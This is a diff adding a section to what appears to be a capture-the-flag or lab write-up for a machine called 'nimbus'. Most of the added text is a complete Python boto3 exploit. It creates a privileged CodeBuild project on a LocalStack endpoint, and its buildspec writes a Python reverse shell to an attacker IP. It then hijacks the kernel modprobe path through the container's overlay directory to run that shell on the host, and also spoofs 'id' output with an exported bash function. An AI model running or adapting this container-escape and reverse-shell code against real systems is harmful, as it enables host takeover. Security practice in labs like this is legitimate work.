@@ -194,5 +194,87 @@ drwxr-xr-x   1 root   root 4096 May  5 00:00 var
 
 **We have full host filesystem access via `/proc/1/root/`**
 
-**Now we should found the deployment files**
+{% code overflow="wrap" %}
+```bash
+curl -s http://floci:4566/_localstack/health 2>/dev/null | python3 -m json.tool
+# "codebuild": "running",
+```
+{% endcode %}
+
+**localstack and coldbuild are running this is a good sign for privilege escalation vector**
+
+{% code overflow="wrap" %}
+```bash
+import boto3
+
+ENDPOINT = "http://floci:4566/"
+REGION = "us-east-1"
+ATTACKER_IP = "10.10.14.109"  
+LPORT = 443
+
+# The buildspec is now perfectly formatted YAML
+buildspec = f"""version: 0.2
+phases:
+  build:
+    commands:
+      - id
+      - cat /proc/self/status | grep Cap
+      - |
+        echo '#!/bin/sh' > /tmp/payload.sh
+        echo "python3 -c \\"import socket,os,pty;s=socket.socket();s.connect(('{ATTACKER_IP}',{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn('/bin/sh')\\"" >> /tmp/payload.sh
+        chmod +x /tmp/payload.sh
+      - |
+        upper=$(awk '/overlay/{{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}}' /proc/mounts | head -1)
+        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
+        printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
+"""
+
+cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)
+
+# Try to create the project, but if it already exists, update it with the fixed buildspec
+try:
+    cb.create_project(
+        name="nimbus-exploit",
+        source={"type": "NO_SOURCE", "buildspec": buildspec},
+        artifacts={"type": "NO_ARTIFACTS"},
+        environment={
+            "type": "LINUX_CONTAINER",
+            "image": "floci/floci:latest",
+            "computeType": "BUILD_GENERAL1_SMALL",
+            "privilegedMode": True,
+            "environmentVariables": [
+                {"name": "BASH_FUNC_id%%",
+                 "value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',
+                 "type": "PLAINTEXT"}
+            ],
+        },
+        serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
+    )
+    print("[+] Project created successfully!")
+except Exception as e:
+    print(f"[*] Project already exists, updating with fixed buildspec...")
+    cb.update_project(
+        name="nimbus-exploit",
+        source={"type": "NO_SOURCE", "buildspec": buildspec},
+        artifacts={"type": "NO_ARTIFACTS"},
+        environment={
+            "type": "LINUX_CONTAINER",
+            "image": "floci/floci:latest",
+            "computeType": "BUILD_GENERAL1_SMALL",
+            "privilegedMode": True,
+            "environmentVariables": [
+                {"name": "BASH_FUNC_id%%",
+                 "value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',
+                 "type": "PLAINTEXT"}
+            ],
+        },
+        serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
+    )
+    print("[+] Project updated successfully!")
+
+# Start the build
+resp = cb.start_build(projectName="nimbus-exploit")
+print(f"[+] Build started: {resp['build']['id']}")
+```
+{% endcode %}
 
